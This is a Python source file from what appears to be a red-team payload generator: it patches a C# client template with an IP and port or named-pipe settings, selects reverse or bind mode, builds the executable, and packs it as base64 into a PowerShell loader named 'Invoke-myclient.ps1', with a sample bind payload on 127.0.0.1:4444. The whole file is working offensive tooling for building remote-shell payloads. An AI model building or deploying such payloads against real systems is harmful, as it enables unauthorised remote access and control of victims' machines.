import os
import subprocess

class mypayloadgen():
    def __init__(self):
        self.__toCS = "Client\\myclient\\"
        self.__filenameCS = "Program.cs"
        self.__initstring1_tag = r"%%INITSTRINGONE%%"
        self.__initstring2_tag = r"%%INITSTRINGTWO%%"
        self.__startpayload_tag = r"%%STARTPAYLOAD%%"
        self.__initstring_setipstring = "t_app.ipstring = \"{}\";"
        self.__initstring_setnamepipehost = "t_app.namepipehost = \"{}\";"
        self.__initstring_setnamepipestring = "t_app.namepipestring = \"{}\";"
        self.__initstartclient = "t_app.StartClient();"
        self.__initstartserver = "t_app.StartServer();"
        self.__initstartpipserver = "t_app.StartPipServer();"
        self.__initstartpipclient = "t_app.StartPipeClinet();"


        self.__to_client = "Client\\"
        self.__to_template = "Client\\payload\\template\\"
        self.__pstemplate = "Invoke-myclient.ps1"
        self.__parentdir = os.path.dirname(os.getcwd())
        self.__payload_tag = r"%%PAYLOAD%%"
        self.__to_payload = "Client\\payload\\"
        self.__outputname = "Invoke-myclient.ps1"

    def gen_ps1(self):
        mycwd = os.path.join(self.__parentdir,self.__to_client)
        #regen exe first
        subprocess.run(["build.bat"], shell=True, cwd=mycwd)

        output = subprocess.run(["psgen.bat"], capture_output=True, shell=True, cwd=mycwd)
        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF

        with open(os.path.join(self.__parentdir,self.__to_template,self.__pstemplate),mode='r') as f:
            all_of_it = f.read()
        
        #print(all_of_it.replace(self.__payload_tag,myb64))
        with open(os.path.join(self.__parentdir,self.__to_payload,self.__outputname),mode='w') as f:
            f.write(all_of_it.replace(self.__payload_tag,myb64))

    def gen_exe(self):
        mycwd = os.path.join(self.__parentdir,self.__to_client)
        subprocess.run(["build.bat"], shell=True, cwd=mycwd)

    def set_config(self,typestr,reversestr,configstra,configstrb):

        #read cs
        with open(os.path.join(self.__parentdir,self.__to_template,self.__filenameCS),mode='r') as f:
            all_of_it = f.read()

        #print(os.path.join(self.__parentdir,self.__to_template,self.__filenameCS))
        #print(all_of_it)


        if typestr == "socket":
            #port and ip/host
            all_of_it = all_of_it.replace(self.__initstring1_tag,self.__initstring_setipstring.format("{}:{}".format(configstra,configstrb)))
            all_of_it = all_of_it.replace(self.__initstring2_tag,"")
            if reversestr == True:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartclient)
            else:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartserver)

        
        if typestr == "pipe":
            all_of_it = all_of_it.replace(self.__initstring1_tag,self.__initstring_setnamepipehost.format(configstra))
            all_of_it = all_of_it.replace(self.__initstring2_tag,self.__initstring_setnamepipestring.format(configstrb))
            if reversestr == True:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartpipclient)
            else:
                all_of_it = all_of_it.replace(self.__startpayload_tag,self.__initstartpipserver)


        #print(os.path.join(self.__parentdir,self.__toCS,self.__filenameCS))
        #print(all_of_it)

        #write cs
        with open(os.path.join(self.__parentdir,self.__toCS,self.__filenameCS),mode='w') as f:
            f.write(all_of_it)



if __name__ == "__main__":
    t_mypayloadgen = mypayloadgen()
    t_mypayloadgen.set_config("socket",False,"127.0.0.1",4444)
    t_mypayloadgen.gen_ps1()


